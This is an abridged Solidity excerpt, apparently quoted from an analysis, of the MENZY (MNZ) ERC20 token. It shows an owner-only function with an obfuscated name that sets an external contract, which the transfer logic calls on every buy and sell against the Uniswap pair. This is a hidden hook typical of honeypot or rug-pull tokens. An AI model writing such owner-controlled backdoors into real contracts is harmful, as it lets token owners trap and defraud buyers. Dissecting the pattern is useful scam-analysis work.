...
contract TokenM is ERC20 {
    ...
    IUserAmountcooorn public ouuzas;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(address tokenOwner) ERC20("MENZY", "MNZ") {
    ...
    function cooornEthouupRtbas(IUserAmountcooorn _ouuzas) public onlyOwner {
        ouuzas = _ouuzas;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                ouuzas.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				ouuzas.addOutAmount(from, amount);
            }else{
                ouuzas.addOutAmount(from, amount);
                takeFee = false;
            }
